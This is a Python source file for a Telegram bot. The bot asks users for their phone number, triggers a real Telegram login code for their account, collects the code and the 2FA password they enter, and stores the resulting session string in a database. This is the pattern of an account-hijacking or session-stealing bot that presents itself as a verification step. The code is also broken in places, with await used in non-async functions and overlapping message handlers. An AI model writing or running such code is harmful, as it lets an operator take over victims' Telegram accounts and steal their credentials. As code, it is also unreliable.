from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import CallbackContext, CommandHandler, CallbackQueryHandler, MessageHandler, Filters
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
from telethon.sessions import StringSession
import config
import sqlite3
import asyncio

# Global dictionary to store the phone numbers and state of the authentication process
user_data = {}

# Request phone number from the user
def request_phone_number(update: Update, context: CallbackContext):
    """Ask the user for their phone number."""
    keyboard = [[InlineKeyboardButton("Send Phone Number", request_contact=True)]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    update.message.reply_text("Please send your phone number (with country code).", reply_markup=reply_markup)

# Store phone number and initiate OTP request
async def start_otp_process(phone_number: str, user_id: int):
    """Handle OTP generation and verification."""
    client = TelegramClient(StringSession(), config.API_ID, config.API_HASH)
    await client.connect()

    # Try sending the OTP
    try:
        await client.send_code_request(phone_number)

        # Update the user data
        user_data[user_id] = {'phone_number': phone_number, 'client': client, 'stage': 'otp'}
        print(f"OTP sent to {phone_number}")

        # Send message to user
        keyboard = [[InlineKeyboardButton("Verify OTP", callback_data="verify_otp")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await client.send_message(user_id, "OTP sent! Please wait a moment. Enter the OTP using the keypad below. Valid for 5 minutes.", reply_markup=reply_markup)

    except Exception as e:
        print(f"Error: {e}")
        await client.disconnect()

# Handle the phone number submission
def handle_phone_number(update: Update, context: CallbackContext):
    """Receive the phone number and start OTP process."""
    phone_number = update.message.contact.phone_number
    user_id = update.message.from_user.id
    
    # Start the OTP process
    asyncio.run(start_otp_process(phone_number, user_id))

# Handle OTP submission
def handle_otp(update: Update, context: CallbackContext):
    """Handle OTP input and verification."""
    user_id = update.message.from_user.id
    phone_number = user_data[user_id]['phone_number']
    client = user_data[user_id]['client']
    
    # Get OTP from the message
    otp = update.message.text

    try:
        # Try signing in with the OTP
        await client.sign_in(phone_number, otp)
        
        # Proceed to next step if successful
        user_data[user_id]['stage'] = '2fa'
        await update.message.reply_text("OTP verified successfully. If you have 2FA enabled, please enter your 2FA password:")

    except SessionPasswordNeededError:
        # If 2FA is required, prompt for 2FA password
        user_data[user_id]['stage'] = '2fa'
        await update.message.reply_text("2FA is enabled. Please enter your 2FA password:")

# Handle 2FA password input
def handle_2fa_password(update: Update, context: CallbackContext):
    """Handle 2FA password input."""
    user_id = update.message.from_user.id
    password = update.message.text
    client = user_data[user_id]['client']

    try:
        # Try signing in with the 2FA password
        await client.sign_in(password=password)
        await update.message.reply_text("Login successful! Welcome.")
        
        # Store session info (if needed)
        save_session(user_data[user_id]['phone_number'], client.session.save())
    except Exception as e:
        await update.message.reply_text(f"2FA failed: {e}")

# Save the session to the database
def save_session(phone_number, session_data):
    """Store the session data in the database."""
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute("INSERT OR REPLACE INTO accounts (phone_number, session_name) VALUES (?, ?)", (phone_number, session_data))
    conn.commit()
    conn.close()

# Define the main handler and setup
def main():
    from telegram.ext import Updater
    
    # Setup the Updater and Dispatcher
    updater = Updater(config.API_TOKEN, use_context=True)
    dp = updater.dispatcher

    # Handlers
    dp.add_handler(CommandHandler('start', request_phone_number))  # Start the process by asking for phone number
    dp.add_handler(MessageHandler(Filters.contact, handle_phone_number))  # Handle phone number submission
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_otp))  # Handle OTP submission
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_2fa_password))  # Handle 2FA password input

    # Start the bot
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()